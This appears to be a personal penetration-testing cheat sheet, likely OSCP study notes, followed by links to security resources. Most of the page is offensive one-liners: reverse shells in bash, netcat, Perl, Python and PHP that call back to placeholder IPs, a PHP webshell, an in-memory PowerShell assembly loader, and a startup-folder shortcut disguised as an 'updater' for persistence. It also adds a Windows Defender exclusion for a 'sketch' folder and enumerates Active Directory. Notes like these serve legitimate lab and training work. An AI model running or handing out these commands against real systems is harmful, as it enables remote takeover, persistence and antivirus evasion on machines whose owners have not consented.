---
layout: single
title: Notes
permalink: /notes/
author_profile: true
---

- [Powershell](#powershell)
  - [One liner run command as another user](#one-liner-run-command-as-another-user)
  - [One liner to execute base64 encoded assembly](#one-liner-to-execute-base64-encoded-assembly)
  - [Run arbitrary assembly](#run-arbitrary-assembly)
  - [Download file](#download-file)
  - [Powershell-friendly base64 from Linux](#powershell-friendly-base64-from-linux)
  - [Base64 encode file](#base64-encode-file)
  - [Create a shortcut lnk one-liner](#create-a-shortcut-lnk-one-liner)
  - [Create a Windows Defender exclusion](#create-a-windows-defender-exclusion)
  - [Various AD commands without AD cmdlets](#various-ad-commands-without-ad-cmdlets)
- [Shells](#shells)
  - [Upgrade to PTY](#upgrade-to-pty)
  - [Bash](#bash)
  - [nc no e](#nc-no-e)
  - [Perl](#perl)
  - [Python](#python)
  - [PHP](#php)
  - [Sites/Cheat sheets](#sitescheat-sheets)
    - [PayloadsAllTheThings](#payloadsallthethings)
    - [Pentestmonkey](#pentestmonkey)
- [Resources(Useful Websites)](#resourcesuseful-websites)
  - [General/OSCP](#generaloscp)
  - [Privilege Escalation](#privilege-escalation)
    - [Linux](#linux)
    - [Windows](#windows)
  - [Active Directory](#active-directory)
    - [Offense](#offense)
    - [Defense](#defense)
  - [Web App](#web-app)
  - [Buffer Overflow](#buffer-overflow)
  - [Wireless](#wireless)
  - [Tools](#tools)

## Powershell/AD
### One liner run command as another user

> ```$secpasswd = ConvertTo-SecureString "xxxxx" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", $secpasswd); Invoke-Command -ComputerName re -Credential $creds -ScriptBlock {c:\path\to\cmd.exe 10.10.10.1 9003 -e cmd}```

### One liner to execute base64 encoded assembly

> ```[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(<base64-str-here>)).EntryPoint.Invoke($null,@(,([string[]](""))))```
  
### Run arbitrary assembly

> ```$as.EntryPoint.Invoke($null, @(,[string[]]("arg1", "arg2", "etc")))```

### Download file

> ```iwr -Uri <url> -OutFile <name>```

### Powershell-friendly base64 from Linux

> ```echo -n '<text>' | iconv -f UTF8 -t UTF16LE | base64```

### Base64 encode file

> ```[Convert]::ToBase64String([IO.File]::ReadAllBytes(<file-path>))```

### Create a shortcut lnk one-liner

> ```$Shortcut = (New-Object -comObject WScript.Shell).CreateShortcut("C:\users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"); $Shortcut.TargetPath = "C:\users\<user>\AppData\updater2.exe";$Shortcut.Save()```

### Create a Windows Defender exclusion

> ```Add-MpPreference -ExclusionPath "C:\users\lolcats\AppData\mysketchdir"```

### SSH as domain user

> ```ssh -l <user>@<domain> <hostname>```

### Various AD commands without AD cmdlets

Get machines

> ```([adsi]"WinNT://$((Get-WMIObject Win32_ComputerSystem).Domain)").Children | Where-Object {$_.schemaclassname -eq 'computer'}```

Domain user properties

> ```([adsisearcher]"(samaccountname=$env:USERNAME)").FindOne().Properties```

```
givenname
codepage
objectcategory
dscorepropagationdata
usnchanged
instancetype
logoncount
name
badpasswordtime
pwdlastset
objectclass
badpwdcount
samaccounttype
lastlogontimestamp
usncreated
sn
objectguid
memberof
whencreated
adspath
useraccountcontrol
cn
countrycode
primarygroupid
whenchanged
lastlogon
distinguishedname
samaccountname
objectsid
lastlogoff
displayname
accountexpires
userprincipalname
```

Get all groups and members of

> ```([adsisearcher]'(&(objectCategory=group))').FindAll().Properties | % {$m=([ADSI]"LDAP://$($_.distinguishedname)").Member;if($m){write-host "Group: "$_.name;$m}} | % { ([adsisearcher]"(distinguishedname=$_)").FindOne().Properties.samaccountname }```

## Shells
### Upgrade to PTY
Python

> ```python -c 'import pty;pty.spawn("/bin/bash");'```

Python 3

> ```python3 -c 'import pty;pty.spawn("/bin/bash");'```


### Bash
Regular

> ```bash -i >& /dev/tcp/10.0.0.1/8888 0>&1```

Background process

> ```bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'```

### nc no e

> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444```

### Perl

> ```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

### Python
One Liner

> ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

In a script  

```
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```
### PHP
Webshell
> ```<?php echo system($_GET['cmd']); ?>```

Bash reverse shell

> ```<?php system(bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'); ?>```

### Sites/Cheat sheets
#### PayloadsAllTheThings
[Reverse shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
#### Pentestmonkey
[Reverse shell cheat sheet]()

## Resources(Useful Websites)
### General/OSCP
[https://guif.re](https://guif.re)  
[https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)
### Privilege Escalation
#### Linux
[https://guif.re/linuxeop](https://guif.re/linuxeop  
)  
[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
#### Windows
[https://guif.re/windowseop](https://guif.re/windowseop)  
[https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
### Active Directory
#### Offense
[https://blog.harmj0y.net/](https://blog.harmj0y.net/)  
[https://adsecurity.org/](https://adsecurity.org/)  
[https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
#### Defense
[https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)
### Web App
[https://guif.re/webtesting](https://guif.re/webtesting)  
[https://www.apriorit.com/dev-blog/622-qa-web-application-pen-testing-owasp-checklist](https://www.apriorit.com/dev-blog/622-qa-web-application-pen-testing-owasp-checklist)   
[https://github.com/blabla1337/skf-labs](https://github.com/blabla1337/skf-labs)
### Buffer Overflow
[https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)  
[https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)  
[http://netsec.ws/?p=180](http://netsec.ws/?p=180)  
[https://dl.packetstormsecurity.net/papers/general/overflows_and_more.pdf](https://dl.packetstormsecurity.net/papers/general/overflows_and_more.pdf)
### Wireless
[https://www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
### Tools
[https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)  
[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)  
[https://www.exploit-db.com/](https://www.exploit-db.com/)  
[https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)  
[https://crt.sh/](https://crt.sh/)
